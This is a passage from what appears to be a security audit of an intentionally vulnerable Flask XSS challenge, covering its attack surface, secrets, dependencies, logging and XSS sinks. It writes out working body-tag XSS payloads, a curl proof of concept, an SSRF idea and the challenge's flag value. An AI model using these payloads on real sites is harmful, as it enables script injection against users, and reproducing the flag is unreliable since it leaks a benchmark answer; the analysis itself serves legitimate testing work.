2. Localhost requests are safe (loopback interface only)
3. 5-second timeout prevents indefinite hangs
4. Temporary file cleanup prevents disk exhaustion (cleanup in finally block)

**Attack Vectors:**
- **PhantomJS Exploitation:** CVE-2018-11518 (RCE) or CVE-2019-17221 (file read) could allow escaping sandbox
- **SSRF via HTML:** Inject `<body background="http://internal-network/...">` to make PhantomJS fetch internal resources
- **Process Exhaustion:** Rapid requests could spawn many PhantomJS processes (no rate limiting)

---

### Background Processing

**Finding:** NO PERSISTENT BACKGROUND JOBS

**Temporary Subprocess Execution:**

**Process:** PhantomJS Validation (Triggered by HTTP Request)
- **File Path:** `/src/app.py` lines 34-50 (within `check_input()` function)
- **Trigger:** HTTP GET `/page?name=...`
- **Execution Context:** Synchronous (blocks HTTP response)
- **Lifetime:** ~5 seconds maximum (timeout enforced)
- **Privilege Model:** Same user as Flask app (root in container)

**Code:**
```python
proc = subprocess.Popen(
    ["timeout","5","phantomjs", "check.js"], 
    stdout=subprocess.PIPE, 
    stdin=subprocess.PIPE
)
```

**Security Analysis:**

**Command Injection Risk:** ✓ MITIGATED
- Uses list format for Popen (not shell=True)
- No user input in command arguments
- User input passed via stdin (safer)

**Timeout Protection:** ✓ IMPLEMENTED
- `timeout 5` command enforces 5-second limit
- Prevents indefinite resource consumption
- Kills PhantomJS if it hangs

**Privilege Escalation:** ❌ RISK
- PhantomJS runs as root (container has no USER directive)
- If PhantomJS is exploited, attacker has root access in container
- No seccomp, AppArmor, or capability restrictions

**Resource Limits:** ❌ NONE
- No limit on concurrent PhantomJS processes
- No CPU/memory limits per process
- Vulnerable to resource exhaustion

**Job Security Model:**
- **Input Sanitization:** Weak (regex blacklist only)
- **Output Validation:** Basic (checks for "XSS" string)
- **Error Handling:** Present (try/except blocks)
- **Cleanup:** Implemented (files deleted in finally block)

---

### Attack Surface Summary Table

| Entry Point | Network Accessible | Auth Required | Primary Risk | Severity |
|-------------|-------------------|---------------|--------------|----------|
| `GET /` | ✓ Yes | ❌ No | Information Disclosure | LOW |
| `GET /page?name=` | ✓ Yes | ❌ No | XSS, DoS, Flag Disclosure | CRITICAL |
| `GET /static/*` | ✓ Yes | ❌ No | Race Condition, Info Disclosure | LOW |
| PhantomJS Subprocess | ❌ Internal Only | N/A | RCE, SSRF | HIGH |

**Overall Attack Surface Rating:** CRITICAL

**Primary Attack Path:** `GET /page?name=<body onload=alert('XSS')>` → Flag Disclosure

**Secondary Attack Paths:**
1. Resource exhaustion via large payloads or rapid requests
2. PhantomJS exploitation for container escape
3. Log injection via crafted payloads
4. Temporary file race conditions

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Current Implementation:** INSECURE (Plaintext File + Docker Build Args)

**Secret Storage Analysis:**

**1. Runtime Secret File**
- **Location:** `/src/secret.txt` (container path: `/python-docker/secret.txt`)
- **Format:** Plaintext
- **Permissions:** Default umask (likely 0644 - world-readable)
- **Access Control:** None (any process can read)
- **Rotation:** Not implemented
- **Code Reference:** `/src/app.py` line 22
  ```python
  flags = open('secret.txt').read().split()
  ```

**2. Build-Time Secret Injection**
- **Method:** Docker ARG (INSECURE - visible in image layers)
- **Source:** `.env` file → Docker Compose → Dockerfile
- **Dockerfile:** `/src/Dockerfile` lines 24-26
  ```dockerfile
  ARG FLAG
  RUN sed -i s/@FLAG@/$FLAG/g secret.txt
  ```
- **Exposure:** Visible via `docker history <image_id>` and `docker inspect`

**3. Development Environment**
- **File:** `.env` (project root)
- **Content:** `FLAG="flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}"`
- **Risk:** If committed to git, permanently exposed in repository history

**Secret Rotation:** NOT IMPLEMENTED
- No mechanism to update flag without rebuilding container
- No API for secret updates
- No integration with secret management systems

**Recommendations:**
- Use Docker secrets: `docker secret create flag /path/to/flag.txt`
- Mount secrets at runtime: `--mount type=secret,id=flag,target=/run/secrets/flag`
- Use environment variables as minimum improvement
- Integrate with HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault
- Never use ARG for secrets (use BuildKit secret mounts: `RUN --mount=type=secret,id=flag`)

### Configuration Security

**Environment Separation:** NOT IMPLEMENTED

**Configuration Files:**
- **Application Config:** Hardcoded in `/src/app.py` (no config file)
- **Docker Config:** `docker-compose.yml`, `Dockerfile`
- **Environment Variables:** Minimal (only QT and OpenSSL settings)

**No Configuration Management:**
```bash
# Checked for config files
ls /src/*.ini /src/*.yaml /src/*.toml /src/*.conf 2>/dev/null
# Result: None found (only docker-compose.yml exists)
```

**Hardcoded Configuration in Code:**
```python
# /src/app.py
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
app.run(debug=True)  # Hardcoded debug mode
```

**Secret Handling in Configuration:**
- **Flask Secret Key:** ❌ NOT SET (Line 24-25: no `app.secret_key`)
- **Database Credentials:** ❌ N/A (no database)
- **API Keys:** ❌ N/A (no external APIs)
- **Flag:** ❌ INSECURE (plaintext file, not environment variable)

**Environment-Specific Configuration:** NOT IMPLEMENTED
- No dev/staging/prod separation
- Same configuration for all environments
- Debug mode would be enabled in production

**Security Headers Configuration:**

**SEARCHED FOR: Infrastructure-level security headers (Nginx, Kubernetes, CDN)**

**Search Results:**
```bash
# Searched for reverse proxy configurations
find /src -name "nginx.conf" -o -name "apache2.conf" -o -name "*.ingress.yaml"
# Result: No files found

# Searched for Kubernetes configurations
find /src -name "*ingress*.yaml" -o -name "*gateway*.yaml"
# Result: No files found

# Searched for CDN configurations (Cloudflare, etc.)
grep -rn "cloudflare\|cdn\|akamai\|fastly" /src/
# Result: No matches
```

**Finding:** NO INFRASTRUCTURE SECURITY HEADERS CONFIGURED

This application uses Flask's built-in development server (Werkzeug) with no reverse proxy, no Kubernetes ingress, and no CDN layer. There is **no infrastructure configuration** for security headers like:
- `Strict-Transport-Security` (HSTS)
- `Cache-Control`
- `X-Frame-Options`
- `Content-Security-Policy`

**Application-Level Security Headers:**
```bash
# Checked for Flask security header middleware
grep -rn "X-Frame-Options\|Strict-Transport-Security\|Cache-Control\|@app.after_request" /src/app.py
# Result: No matches
```

**Missing Security Headers:**
- `Strict-Transport-Security` (HSTS) - Forces HTTPS (N/A here, no HTTPS configured)
- `Cache-Control` - Controls browser/proxy caching of sensitive data
- `X-Frame-Options` - Prevents clickjacking
- `Content-Security-Policy` - Mitigates XSS (would break intended vulnerability)
- `X-Content-Type-Options` - Prevents MIME sniffing
- `Referrer-Policy` - Controls referrer information leakage

**Deployment Architecture:** Single container with no infrastructure layer
- No reverse proxy (no Nginx, Apache, Caddy)
- No Kubernetes (no Ingress resources)
- No CDN (no Cloudflare, Akamai, Fastly)
- Direct exposure via Docker port mapping

**Recommendation:** Add infrastructure layer with reverse proxy:
```nginx
# Example nginx.conf
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Cache-Control "no-store, no-cache, must-revalidate, max-age=0" always;
```

### External Dependencies

**Third-Party Services:** NONE

**External API Integrations:** NONE (application is completely self-contained)

**Python Dependencies (from `/src/requirements.txt`):**

| Dependency | Version | Latest Version | Known Vulnerabilities | Risk Level |
|------------|---------|----------------|----------------------|------------|
| Flask | 1.1.4 | 3.0.0+ | CVE-2023-30861 (session disclosure) | HIGH |
| phantomjs (pip wrapper) | 1.4.1 | 1.4.1 (abandoned) | PhantomJS binary CVEs | CRITICAL |
| Werkzeug | 1.0.1 (Flask dep) | 3.0.0+ | CVE-2023-46136, CVE-2023-25577 | HIGH |
| Jinja2 | 2.11.3 (Flask dep) | 3.1.0+ | CVE-2024-34064, CVE-2020-28493 | MEDIUM |
| click | 7.1.2 (Flask dep) | 8.1.0+ | None known | LOW |
| itsdangerous | 1.1.0 (Flask dep) | 2.1.0+ | None critical | LOW |
| MarkupSafe | 1.1.1 (Flask dep) | 2.1.0+ | None critical | LOW |

**PhantomJS Binary Dependencies:**
- **Binary:** PhantomJS 2.1.1 (installed via apt-get from Debian archive)
- **Status:** ABANDONED (last release January 2018)
- **WebKit Engine:** Frozen at 2016 vintage
- **Known CVEs:**
  - CVE-2019-17221: Arbitrary file read
  - CVE-2018-11518: Use-after-free (RCE)
  - CVE-2018-7160: Denial of Service
  - Numerous unfixed WebKit vulnerabilities

**Dependency Management:**
- **Python:** pip 20.0.2 (outdated, vulnerabilities exist)
- **Package Lock:** No `requirements.lock` or `Pipfile.lock` (unpinned versions)
- **Vulnerability Scanning:** No evidence of automated scanning
- **Update Policy:** No dependency update process detected

**Supply Chain Security:**
- **Package Sources:** PyPI (default, no private registry)
- **Signature Verification:** Not implemented
- **Dependency Pinning:** ✓ Versions pinned in requirements.txt
- **Transitive Dependencies:** Not explicitly managed

**Security Implications:**
1. **Python 2.7 EOL:** No security patches since January 2020
2. **Outdated Flask:** Known session disclosure vulnerability
3. **PhantomJS Abandoned:** RCE and SSRF vulnerabilities unpatched
4. **No Dependency Scanning:** Vulnerabilities not monitored
5. **No Update Process:** Dependencies frozen in insecure state

### Monitoring & Logging

**Logging Implementation:** BASIC (print statements, not structured logging)

**Current Logging:**

**1. Application Logging**
- **File:** `/src/app.py` lines 41-47
```python
print "Page:"
print page
print "Usuario:"
print msg
print "Resultado:"
print result
```

**2. Logging Module Configuration**
- **File:** `/src/app.py` line 17
```python
logging.basicConfig(level=logging.INFO)
```
**Note:** Configured but never actually used (all logging via `print` statements)

**Security Event Visibility:**

| Event Type | Logged | Log Location | Structured | Alerting |
|------------|--------|--------------|------------|----------|
| HTTP Requests | ⚠️ Partial (Werkzeug) | stdout | ❌ No | ❌ No |
| XSS Attempts | ✓ Yes | stdout | ❌ No | ❌ No |
| Flag Disclosure | ❌ No | Not logged | ❌ No | ❌ No |
| Authentication Failures | N/A | N/A | N/A | N/A |
| Authorization Failures | N/A | N/A | N/A | N/A |
| Error Exceptions | ✓ Yes (debug mode) | stdout | ❌ No | ❌ No |
| PhantomJS Execution | ✓ Yes | stdout | ❌ No | ❌ No |
| File Operations | ❌ No | Not logged | ❌ No | ❌ No |

**Log Content Security Issues:**

1. **Sensitive Data Logged:**
   - User input (XSS payloads) printed directly to stdout
   - Full HTML page content logged
   - Potential flag disclosure in error messages

2. **No Sanitization:**
   - User input logged without sanitization
   - Log injection possible (ANSI escape codes, newlines)
   - Terminal hijacking if logs viewed in terminal

3. **No Structured Logging:**
   - Plain text print statements
   - No JSON formatting
   - Difficult to parse for SIEM systems

**Log Storage & Retention:**
- **Storage:** stdout only (captured by Docker logging driver)
- **Retention:** Depends on Docker configuration (default: json-file driver, no rotation)
- **Access Control:** Container logs accessible via `docker logs` (requires Docker access)
- **Encryption:** ❌ Logs stored in plaintext
- **Rotation:** ❌ Not configured (risk of disk exhaustion)

**Monitoring & Alerting:**
- **Application Monitoring:** ❌ NOT IMPLEMENTED (no APM tools)
- **Security Monitoring:** ❌ NOT IMPLEMENTED (no SIEM integration)
- **Alerting:** ❌ NOT IMPLEMENTED (no alert rules)
- **Metrics Collection:** ❌ NOT IMPLEMENTED (no Prometheus, Grafana)
- **Health Checks:** ⚠️ Basic TCP check only (docker-compose.yml line 9-13)

**Health Check Configuration:**
```yaml
# docker-compose.yml
healthcheck:
  test: timeout 10s bash -c ':> /dev/tcp/127.0.0.1/5000' || exit 1
  timeout: 1s
  retries: 5
  interval: 10s
```
**Assessment:** Only checks if port 5000 is listening, not application health

**Recommendations:**
1. Replace `print` statements with proper `logging` module usage
2. Implement structured logging (JSON format)
3. Sanitize user input before logging
4. Never log sensitive data (flags, credentials)
5. Implement log rotation (logrotate or Docker log limits)
6. Add security event monitoring (failed exploits, unusual patterns)
7. Integrate with SIEM (Splunk, ELK, Datadog)
8. Implement alerting for security events
9. Add application performance monitoring (New Relic, Datadog APM)
10. Implement comprehensive health checks (database connectivity, dependency availability)

**Current Security Event Visibility Rating:** LOW (basic logging without security context)

---

## 7. Overall Codebase Indexing

This codebase represents a minimalist Flask application designed as a Cross-Site Scripting (XSS) security challenge, with a deliberately simple structure optimized for educational purposes rather than production scalability. The application comprises only 329 lines of Python code (excluding HTML templates and static assets), demonstrating an intentionally constrained scope focused entirely on a single vulnerability class.

**Directory Structure and Organization:**

The codebase follows a flat, single-directory architecture with no nested module structure:

```
XBEN-050-24/
├── .env                          # Environment variables (FLAG storage)
├── docker-compose.yml            # Container orchestration
├── Makefile                      # Build automation
├── benchmark.json                # Challenge metadata
└── src/                          # Application source directory
    ├── Dockerfile                # Container build definition
    ├── requirements.txt          # Python dependencies (2 packages)
    ├── secret.txt                # Flag storage (template: @FLAG@)
    ├── app.py                    # Main Flask application (76 lines)
    ├── constants.py              # HTML templates and config (205 lines)
    ├── check.js                  # PhantomJS validation script (48 lines)
    └── static/                   # Frontend assets
        ├── assets/
        │   └── fav-icon.png
        ├── css/
        │   ├── style.css         # Main stylesheet
        │   ├── fonts/            # Custom web fonts (Game-Of-Squids)
        │   └── styles/           # Page-specific CSS (7 files)
        │       ├── index.css
        │       ├── page0.css through page6.css
        └── img/
            ├── logo5_white.png
            ├── dalgonabg.jpg
            └── cookies/          # Challenge status images (15 PNG files)
```

**Codebase Characteristics Impacting Security Discovery:**

1. **No Modular Structure:** The entire application logic resides in a single 76-line `app.py` file, with HTML templates hardcoded as string constants in `constants.py`. This flat architecture makes complete security auditing trivial - all attack surface elements are immediately visible without deep directory traversal or import chain analysis.

2. **No Framework Conventions:** Unlike production Flask applications that follow blueprints, application factories, or MVC patterns, this codebase uses the simplest possible Flask initialization (`app = Flask(__name__)`). There are no authentication decorators, no middleware chains, no database models, and no service layers to analyze. Security-relevant code is concentrated in two functions: `index()` (lines 29-31) and `page22()` (lines 63-72).

3. **Embedded Configuration:** No separate configuration management system exists. All configuration is either hardcoded (`app.run(debug=True)`), stored in plaintext files (`secret.txt`), or managed via Docker environment variables. This eliminates the need to search across `config/`, `settings/`, or `.ini` files, but also means no environment-based security controls (dev/staging/prod separation) are possible without code modification.

4. **Static Asset Management:** The `static/` directory follows Flask conventions for automatic serving, but notably includes **dynamically created temporary files** (random-named `.html` files) alongside permanent assets. This creates a unique race condition attack surface where user-generated content briefly exists in a web-accessible location before cleanup.

5. **Build Orchestration:** The `Makefile` provides simple Docker build/run commands (`make start`, `make stop`, `make build`), wrapping Docker Compose operations. Security-relevant build steps occur in the `Dockerfile`, particularly the flag injection via `sed` (lines 24-26) which creates a persistent secret exposure in image layers.

6. **No Testing Infrastructure:** No `tests/` directory, no `pytest` configuration, no test fixtures. This indicates a challenge/demo application rather than production code, but also means no test cases exist that could reveal intended vs. unintended behavior for security analysis.

7. **Dependency Management:** The `requirements.txt` contains only 2 direct dependencies (Flask and phantomjs wrapper), with no lock file (`requirements.lock` or `Pipfile.lock`). This minimal dependency tree reduces supply chain attack surface but also means outdated, vulnerable packages (Flask 1.1.4, Python 2.7) are intentionally pinned without update mechanisms.

8. **Code Generation Absence:** No code generation tools (no `generate.py`, no template engines beyond Jinja2 which is unused, no ORM model generators). All code is hand-written and visible, simplifying security review but also meaning potential vulnerabilities cannot be attributed to generated code patterns.

**Security Component Discoverability:**

The flat architecture creates both advantages and challenges for security assessment:

- **Advantages:** All entry points visible in single `app.py` file; all HTML templates in single `constants.py` file; all external execution in single `check.js` file; no hidden routes or middleware to discover; no complex import chains to trace.

- **Challenges:** Lack of separation of concerns means security controls (or lack thereof) are not centralized; no dedicated `auth.py`, `validation.py`, or `security.py` modules to audit; configuration scattered between code, Dockerfile, and environment variables; no documentation or comments explaining security decisions.

**Build and Deployment Conventions:**

The application uses Docker as its sole deployment mechanism, with no Kubernetes manifests, no Helm charts, no Terraform/Pulumi infrastructure-as-code. The `docker-compose.yml` is minimal (15 lines), exposing only essential configuration:
- Port mapping (5000 → random host port)
- Build argument for FLAG injection
- Basic TCP healthcheck

This simplicity means all deployment security issues are concentrated in the Dockerfile and docker-compose configuration, particularly:
- Base image selection (Python 2.7.18-slim on Debian Buster)
- Package sources (archive.debian.org for EOL packages)
- Root user execution (no USER directive)
- Build-time secret injection (ARG FLAG)

**Critical Implications for Penetration Testing:**

1. **Complete Attack Surface in 3 Files:** Auditors need only review `app.py` (application logic), `check.js` (PhantomJS execution), and `constants.py` (templates) to understand 100% of the application's network-accessible functionality.

2. **No Hidden Endpoints:** Unlike production applications with auto-discovered routes, admin panels, or API versioning, this application has exactly 2 routes (`/` and `/page`) plus static file serving. No discovery tools (dirb, gobuster) will find additional attack surface.

3. **No Authentication to Bypass:** The absence of `auth/`, `login/`, or user management modules immediately signals that all endpoints are public, eliminating an entire category of potential vulnerabilities (authentication bypass, session fixation, etc.).

4. **Template Analysis Simplified:** With templates as string constants rather than separate `.html`/`.jinja2` files, all template injection analysis can be performed via grep/search without understanding template inheritance chains or include mechanisms.

5. **Single Vulnerability Focus:** The codebase's name ("XSS Challenge"), combined with its minimal scope and PhantomJS integration, signals that the primary (potentially only) intended vulnerability is XSS. This allows focused testing rather than broad vulnerability scanning.

**Tools and Conventions Used:**

- **Build:** Docker + Docker Compose (no CI/CD detected)
- **Dependency Management:** pip + requirements.txt (no Poetry, Pipenv, conda)
- **Linting/Formatting:** None detected (no `.flake8`, `.pylintrc`, `black` config)
- **Version Control:** Git (`.git/` directory present)
- **Documentation:** Minimal (only `benchmark.json` metadata, no README.md or docs/)
- **Testing:** None (no pytest, unittest, or test fixtures)
- **Logging:** Basic print statements (no structlog, no ELK integration)

**Conclusion:** This codebase's extreme simplicity and flat structure make it ideal for security training (complete attack surface is immediately apparent) but would be catastrophic for production deployment (no security controls, no scalability, no maintainability). The lack of modular organization means there are no dedicated security components to discover - security (or its absence) is embedded directly in the application logic.

---

## 8. Critical File Paths

All file paths referenced in this security analysis, categorized by their security relevance for manual review:

### Configuration

- `/docker-compose.yml` - Container orchestration, port mapping, FLAG build argument injection
- `/src/Dockerfile` - Container build, Python 2.7 base image, PhantomJS installation, flag substitution
- `/.env` - Environment variables containing FLAG value in plaintext
- `/Makefile` - Build automation scripts

### Authentication & Authorization

**NONE** - No authentication or authorization infrastructure exists in this application.

### API & Routing

- `/src/app.py` - Main Flask application with all route definitions
  - Lines 29-31: `GET /` (index endpoint)
  - Lines 63-72: `GET /page?name=` (XSS challenge endpoint)
- `/src/constants.py` - HTML template content for all pages
  - Lines 1-30: INDEX_CONTENT (landing page)
  - Lines 49-125: XSS_CONTENT_TAG (challenge page template)

### Data Models & DB Interaction

**NONE** - No database, no ORM, no data models exist in this application.

### Dependency Manifests

- `/src/requirements.txt` - Python package dependencies (Flask 1.1.4, phantomjs 1.4.1)

### Sensitive Data & Secrets Handling

- `/src/secret.txt` - Flag storage file (template containing `@FLAG@` placeholder, replaced at build time)
- `/.env` - Development environment flag value: `FLAG="flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}"`
- `/src/app.py` line 22 - Flag loading: `flags = open('secret.txt').read().split()`
- `/src/Dockerfile` lines 24-26 - Build-time flag injection via sed

### Middleware & Input Validation

- `/src/app.py` lines 66-67 - XSS filter regex (blacklist implementation)
  ```python
  blacklist = r'<(?!body\b)[^>]+>'
  msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
  ```
- `/src/app.py` line 58 - Partial output encoding: `cgi.escape(result)`

### Logging & Monitoring

- `/src/app.py` lines 15-17 - Logging configuration: `logging.basicConfig(level=logging.INFO)`
- `/src/app.py` lines 41-47 - User input logging (print statements)

### Infrastructure & Deployment

- `/src/Dockerfile` - Container build definition
  - Line 2: Base image (Python 2.7.18-slim)
  - Line 10: PhantomJS installation
  - Lines 12-13: Environment variables (QT_QPA_PLATFORM, OPENSSL_CONF=/dev/null)
  - Line 24-26: ARG FLAG and sed substitution
  - Line 28: CMD to run Flask
- `/docker-compose.yml` - Service orchestration
  - Lines 5-6: Build args (FLAG)
  - Lines 7-8: Port mapping
  - Lines 9-13: Health check configuration

### XSS Sinks & Attack Surface

- `/src/app.py` line 68 - User input template injection: `value = '{0}'.format(msg)`
- `/src/app.py` line 70 - Template rendering with user input: `XSS_CONTENT_TAG.format("22", "Star", value, "", "")`
- `/src/app.py` lines 35-40 - Temporary file creation with user content
- `/src/check.js` - PhantomJS XSS validation script
  - Lines 8-18: Alert/Confirm/Prompt handlers
  - Line 20: URL loading: `page.open(input, ...)`
  - Line 32: Auto-focus trigger

### SSRF Sinks

- `/src/check.js` line 20 - PhantomJS page.open() (indirect SSRF via HTML content)
- `/src/app.py` lines 34-50 - PhantomJS subprocess execution with user-influenced content

### CTF Flag Storage

- `/src/secret.txt` - Primary flag storage (runtime)
- `/.env` - Development flag value
- `/src/Dockerfile` lines 24-26 - Build-time flag injection mechanism
- `/src/app.py` line 22 - Flag loading into application memory
- `/src/app.py` line 56 - Flag disclosure on successful XSS

### Static Assets (Not Security-Critical, Listed for Completeness)

- `/src/static/css/style.css` - Main stylesheet
- `/src/static/css/styles/index.css` - Index page styles
- `/src/static/css/styles/page0.css` through `/src/static/css/styles/page6.css` - Challenge page styles
- `/src/static/css/fonts/*` - Web font files
- `/src/static/assets/fav-icon.png` - Favicon
- `/src/static/img/logo5_white.png` - Logo image
- `/src/static/img/dalgonabg.jpg` - Background image
- `/src/static/img/cookies/*.png` - Challenge status images (15 files)

### Temporary Files (Created Dynamically)

- `/src/static/<random-32-hex-chars>.html` - User-generated HTML files (created during XSS validation, deleted after ~5 seconds)

---

## 9. XSS Sinks and Render Contexts

**SCOPE:** This section catalogs XSS sinks in network-accessible web application pages only. All findings are reachable via HTTP requests to the deployed application.

### Summary

**Total XSS Sinks Identified:** 4 (all in network-accessible endpoints)

**Exploitability:** HIGH - Primary sink is intentionally vulnerable with weak filtering

**Critical Finding:** The application's XSS filter specifically allows `<body>` tags while blocking other HTML elements, creating an intentional vulnerability for the CTF challenge.

---

### Sink 1: User Input Template Injection (PRIMARY XSS SINK)

**Sink Type:** XSS (Reflected)  
**Render Context:** HTML Body Context  
**Network Accessibility:** ✓ YES - Via `GET /page?name=<payload>`

**File Path:** `/src/app.py`  
**Line Numbers:** 66-70

**Code Snippet:**
```python
# Line 64: User input extraction
msg = request.args.get('name','')

# Lines 66-67: Weak blacklist filter
blacklist = r'<(?!body\b)[^>]+>'
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)

# Line 68: String formatting (no escaping)
value =  "" if msg == "" else '{0}'.format(msg)

# Line 70: Template injection with user input
data = XSS_CONTENT_TAG.format("22", "Star", value, "", "")
```

**User Input Source:** 
- **HTTP Parameter:** `GET /page?name=<user_input>`
- **Flask Request Object:** `request.args.get('name','')`
- **No Size Limit:** Accepts payloads of any length

**Render Context Details:**

The filtered user input is injected into position `{2}` of the `XSS_CONTENT_TAG` template (defined in `/src/constants.py` lines 49-125):

```html
<!-- From constants.py, showing where {2} (user input) is placed -->
<div class="wrap text-center">
    <input type=text name=name placeholder="Enter your name...">
    {2}  <!-- USER INPUT RENDERED HERE -->
</div>
```

**Context:** HTML Body Context (after an `<input>` element, inside a `<div>` container)

**Exploitability Assessment:**

**HIGH** - Intentionally exploitable with multiple bypass vectors:

1. **Body Tag Event Handlers:**
   - **Payload:** `<body onload=alert('XSS')>`
   - **Why It Works:** Regex uses negative lookahead `(?!body\b)` to ALLOW `<body>` tags
   - **Execution:** PhantomJS loads HTML, triggers onload event

2. **Alternative Event Handlers:**
   - `<body onfocus=alert('XSS') autofocus>`
   - `<body onpageshow=alert('XSS')>`
   - `<body onhashchange=alert('XSS')>`
   - All event attributes are NOT filtered (only tags are filtered)

3. **Attribute-Based Attacks:**
   - `<body background="javascript:alert('XSS')">`
   - `<body style="behavior:url(...)">` (IE-specific, not relevant for PhantomJS)

**Full Exploit Chain:**
```
1. Attacker sends: GET /page?name=<body onload=alert('XSS')>
2. Flask extracts: msg = '<body onload=alert(\'XSS\')>'
3. Regex filter: Matches nothing (body tag is allowed), msg unchanged
4. Format operation: value = '<body onload=alert(\'XSS\')>'
5. Template injection: HTML contains '<body onload=alert(\'XSS\')>'
6. File creation: Written to static/<random>.html
7. PhantomJS loads: http://localhost:5000/static/<random>.html
8. JavaScript executes: alert('XSS') triggered
9. check.js captures: Output = "XSS"
10. Flag disclosed: Server returns flag in response
```

**Proof of Concept:**
```bash
curl "http://localhost:5000/page?name=%3Cbody%20onload%3Dalert('XSS')%3E"
```

---

### Sink 2: Temporary File Content (Race Condition XSS)

**Sink Type:** XSS (Stored - Temporary)  
**Render Context:** Full HTML Document  
**Network Accessibility:** ✓ YES - Via `GET /static/<random-filename>.html` (if accessed before deletion)

**File Path:** `/src/app.py`  
**Line Numbers:** 35-40

**Code Snippet:**
```python
# Line 35: Random filename generation
fn = "static/" + os.urandom(16).encode('hex') + '.html'

# Line 38-40: User-controlled content written to file
of = open(fn, 'w')
of.write(page)  # 'page' contains user input from template injection
of.close()
```

**User Input Source:**
- **Indirect:** User input flows through template injection (Sink 1) into `page` variable
- **Content:** Full HTML page with embedded XSS payload

**Render Context Details:**

The `page` variable contains a complete HTML document with user input embedded:

```html
<!DOCTYPE html>
<html>
<head>...</head>
<body>
    <div class="wrap text-center">
        <input type=text name=name placeholder="Enter your name...">
        <body onload=alert('XSS')>  <!-- User input here -->
    </div>
</body>
</html>
```

**Context:** Full HTML Document (user input rendered in HTML body)

**Exploitability Assessment:**

**LOW-MEDIUM** - Requires race condition exploitation:

**Attack Vector:**
1. Attacker sends XSS payload to `/page?name=<payload>`
2. Server creates temporary file: `static/<32-hex-chars>.html`
3. **Race Window:** File exists for ~5 seconds before deletion (line 50)
4. Attacker must guess filename and request it before deletion
5. If successful, browser loads HTML and executes XSS payload

**Challenges:**
- **Filename Entropy:** 32 hexadecimal characters = 128 bits of entropy (2^128 possibilities)
- **Time Window:** ~5 seconds (PhantomJS timeout period)
- **Brute Force Infeasibility:** Cannot realistically guess filename in time

**Alternative Exploitation:**
- Monitor network traffic to observe filename if attacker controls network
- Local file system access (requires container compromise)
- Error messages that leak filename (none found)

**Likelihood:** LOW (impractical to exploit without additional information leakage)

---

### Sink 3: Flag Disclosure HTML Injection

**Sink Type:** HTML Injection (Potential XSS if flag contains HTML/JS)  
**Render Context:** HTML Body Context  
**Network Accessibility:** ✓ YES - Via `GET /page?name=<payload>` (after successful XSS)

**File Path:** `/src/app.py`  
**Line Number:** 56

**Code Snippet:**
```python
# Line 56: Flag injected into HTML without escaping
if result == 'XSS':
    data = '<div class="solution-text"><img src="{0}" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: {1}</div>'.format(IMAGE_ROUTES[tag]['success'],flag)
```

**User Input Source:**
- **Not Direct User Input:** Flag value comes from `secret.txt`
- **Potential Risk:** If flag contains HTML/JavaScript, it would execute

**Render Context Details:**

Flag rendered directly into HTML without encoding:
```html
<div class="solution-text">
    <img src="..." alt="Correct" width="150" height="150">
    <br>Congratulations!
    <p> Here is the flag: FLAG{...}  <!-- No HTML escaping -->
</div>
```

**Context:** HTML Body Context (inside paragraph tag)

**Exploitability Assessment:**

**THEORETICAL** - Depends on flag content:

**If Flag Contains:**
- **Plain Text:** `flag{abc123}` → No XSS (safe)
- **HTML Tags:** `flag{<script>alert(1)</script>}` → XSS executes
- **Event Handlers:** `flag{<img src=x onerror=alert(1)>}` → XSS executes

**Current Flag Analysis:**
```python
# From .env file
FLAG="flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}"
```
**Assessment:** Current flag is alphanumeric GUID format - SAFE (no XSS)

**Risk:** If flag generation/configuration allows special characters, XSS becomes possible.

**Recommendation:** Always use `cgi.escape()` or Jinja2 auto-escaping, even for "trusted" content:
```python
data = '<div>Here is the flag: {1}</div>'.format(..., cgi.escape(flag))
```

---

### Sink 4: PhantomJS JavaScript Execution Context

**Sink Type:** JavaScript Execution (Server-Side Headless Browser)  
**Render Context:** JavaScript Context (PhantomJS)  
**Network Accessibility:** ✓ YES - Triggered via `GET /page?name=<payload>`

**File Path:** `/src/check.js`  
**Line Numbers:** 8-18, 32

**Code Snippet:**
```javascript
// Lines 8-18: Alert/Confirm/Prompt capture
page.onAlert = function(msg) {
  console.log(msg);
};

page.onConfirm = function(msg) {
  console.log(msg);
};

page.onPrompt = function(msg) {
  console.log(msg);
};

// Line 32: Auto-focus trigger
page.evaluate(function(){document.body.focus();});
```

**User Input Source:**
- **Indirect:** User input embedded in HTML file loaded by PhantomJS
- **Trigger:** PhantomJS loads `http://localhost:5000/static/<random>.html`

**Render Context Details:**

PhantomJS acts as a headless browser executing all JavaScript in the loaded HTML:

**Execution Flow:**
```
PhantomJS loads HTML
    ↓
Parses <body onload=alert('XSS')> tag
    ↓
Registers onload event handler
    ↓
Page load complete → triggers onload
    ↓
Executes: alert('XSS')
    ↓
page.onAlert captures output
    ↓
Prints to stdout: "XSS"
    ↓
Python reads stdout and compares to "XSS"
```

**Context:** Server-Side JavaScript Context (not browser, but headless browser environment)

**Exploitability Assessment:**

**CRITICAL** - This is the INTENDED exploit path:

**Win Condition:** Trigger `alert("XSS")` (exact string) in PhantomJS

**Attack Payloads:**

1. **Basic Alert:**
   ```html
   <body onload=alert('XSS')>
   ```

2. **Auto-Focus Trigger:**
   ```html
   <body onfocus=alert('XSS') autofocus>
   ```

3. **Confirm/Prompt (Alternative):**
   ```html
   <body onload=confirm('XSS')>
   <body onload=prompt('XSS')>
   ```

4. **Hash Change Event:**
   ```html
   <body onhashchange=alert('XSS')>#test
   ```

**JavaScript Capabilities in PhantomJS:**

PhantomJS has full JavaScript capabilities, allowing:
- DOM manipulation
- AJAX requests (potential SSRF)
- Local file access (CVE-2019-17221)
- Code execution (CVE-2018-11518)

**Beyond CTF Exploitation:**

While the CTF requires `alert("XSS")`, an attacker could also:
- Execute arbitrary JavaScript
- Make requests to internal network resources
- Read local files (PhantomJS vulnerabilities)
- Potentially escape to host system (container exploit + PhantomJS RCE)

---

### XSS Sinks Not Found

